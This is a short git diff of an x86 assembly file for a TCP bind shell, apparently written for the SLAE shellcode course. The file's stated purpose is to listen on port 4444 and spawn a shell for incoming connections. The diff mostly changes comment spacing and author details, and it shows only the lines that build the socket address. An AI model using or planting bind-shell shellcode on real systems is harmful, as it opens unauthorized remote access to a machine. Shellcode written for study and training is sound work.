@@ -1,7 +1,8 @@
 ; Filename: 	tcp_bind_shellcode_light.nasm
-; Author:	Paolo Perego <paolo@codiceinsicuro.it>  
+; Author:	    Paolo Perego <paolo@codiceinsicuro.it>  
 ; Website:  	https://codiceinsicuro.it
-;
+; Twitter:    @thesp0nge
+; SLAE-ID:    1217
 ; Purpose: binds on TCP port 4444 and spawn a shell on incoming connections. 
 
 
@@ -41,9 +42,9 @@ _start:
 	xor eax, eax
 	mov ax, 0x169 		; 361 in decimal
 	xor ecx, ecx
-	push ecx 		; pushing 32 bit INADDR_ANY
+	push ecx 		      ; pushing 32 bit INADDR_ANY
 	push word 0x5c11	; pushing PORT 4444 in network byte order
-	push word 0x2		; pushing AF_INET as sin_family
+	push word 0x2		  ; pushing AF_INET as sin_family
 
 	mov ecx, esp		; now ECX points to the my_addr data structure
 	mov dl, 0x10		; sizeof(my_addr) = 16 bytes
